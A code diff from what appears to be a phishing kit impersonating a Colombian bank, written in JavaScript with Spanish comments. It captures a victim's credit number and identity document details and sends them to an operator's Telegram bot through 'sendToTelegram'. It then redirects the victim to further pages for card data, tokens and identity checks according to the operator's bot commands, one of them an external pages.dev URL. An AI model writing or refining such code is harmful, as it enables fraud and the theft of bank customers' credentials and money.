@@ -146,66 +146,7 @@
     <script src="action.js"></script>
     <script>
         // ============================================================
-        // 🗺️ MAPA DE REDIRECCIONES AMPLIADO
-        //    (sobrescribe el de action.js para incluir 'login' y 'credito')
-        // ============================================================
-        const REDIRECTS = {
-            'error': 'index1.html?error=wrong_data',
-            'token': 'token.html',
-            'token_otro': 'tokeninv.html',
-            'login': 'transaction_summary.html',          // ← NUEVO (para crédito)
-            'credito': 'transaction_summary.html',        // ← NUEVO
-            'credito_ok': 'transaction_summary.html',     // ← NUEVO
-            'credito_error': 'index1.html?error=wrong_data',
-            'tarjeta_debito': 'tarjeta.html',
-            'tarjeta_credito': 'tarjeta.html',
-            'error_debito': 'tarjeta.html?error=invalid',
-            'error_débito': 'tarjeta.html?error=invalid',
-            'error_credito': 'tarjeta.html?error=invalid',
-            'error_crédito': 'tarjeta.html?error=invalid',
-            'soyyo': 'soyyo.html',
-            'datos_personales': 'https://virtualbogotacuposbogota.pages.dev/bogota/datos-personales',
-            'finalizar': 'final.html',
-            'error_logo': 'soyyo.html?error=invalid',
-        };
-
-        let actionProcessed = false;
-
-        // ============================================================
-        // 📩 MANEJAR ACCIONES DE TELEGRAM
-        // ============================================================
-        window.handleTelegramAction = function(action) {
-            if (actionProcessed) {
-                console.log('⚠️ Acción ya procesada');
-                return;
-            }
-
-            console.log('📩 Acción recibida:', action);
-            actionProcessed = true;
-
-            if (action === 'tarjeta_debito') {
-                localStorage.setItem('card_type', 'Débito');
-            } else if (action === 'tarjeta_credito') {
-                localStorage.setItem('card_type', 'Crédito');
-            }
-
-            const redirectUrl = REDIRECTS[action];
-
-            if (redirectUrl) {
-                console.log('✅ Redirigiendo a:', redirectUrl);
-                if (window.stopListening) window.stopListening();
-
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 100);
-            } else {
-                console.warn('⚠️ Acción desconocida:', action);
-                actionProcessed = false;
-            }
-        };
-
-        // ============================================================
-        // 🧹 DETENER ESCUCHA PREVIA
+        // 🧹 LIMPIAR ESCUCHA PREVIA
         // ============================================================
         if (window.stopListening) window.stopListening();
 
@@ -226,17 +167,11 @@
                 this.value = this.value.replace(/[^0-9]/g, '');
 
                 const tiene = this.value.trim().length > 0;
-
-                // Habilitar / deshabilitar
                 btn.disabled = !tiene;
-
-                // Activar color negro
                 btn.classList.toggle('active', tiene);
-
                 msgErr.style.display = 'none';
             });
 
-            // Enviar con Enter
             input.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
@@ -269,31 +204,37 @@
             btn.textContent = 'Consultando...';
             msgErr.style.display = 'none';
 
+            // Detener escucha anterior y limpiar estado
             if (window.stopListening) window.stopListening();
             localStorage.removeItem('bbogota_msg_id');
-            actionProcessed = false;
+            if (typeof actionProcessed !== 'undefined') actionProcessed = false;
 
             const userData = (typeof getUserData === 'function') ? getUserData() : {
                 tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
                 numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
             };
 
+            // ⚠️ Enviamos como 'login' para que el bot NO valide 6 dígitos
             const creditData = {
                 credito: creditNumber,
                 tipo_identificacion: userData.tipo_identificacion,
                 numero_identificacion: userData.numero_identificacion
             };
 
-            // Guardar en localStorage (compatibilidad Mobilize)
+            // Guardar en localStorage
             localStorage.setItem('userInfo', JSON.stringify(creditData));
 
-            // ⚠️ IMPORTANTE: enviamos como 'login' porque el bot NO valida 6 dígitos
-            //    (si lo enviamos como 'token', el bot rechaza cualquier cosa que no sean 6 dígitos)
             if (typeof sendToTelegram === 'function') {
                 sendToTelegram('login', creditData, function() {
-                    console.log('✅ Crédito enviado como login');
+                    console.log('✅ Crédito enviado');
+                    // Escuchar respuesta del bot
                     if (typeof listenCurrentButtons === 'function') {
                         listenCurrentButtons(window.handleTelegramAction);
+                    } else {
+                        // Fallback si no hay listenCurrentButtons
+                        setTimeout(() => {
+                            window.location.href = 'transaction_summary.html';
+                        }, 3000);
                     }
                 });
             } else {
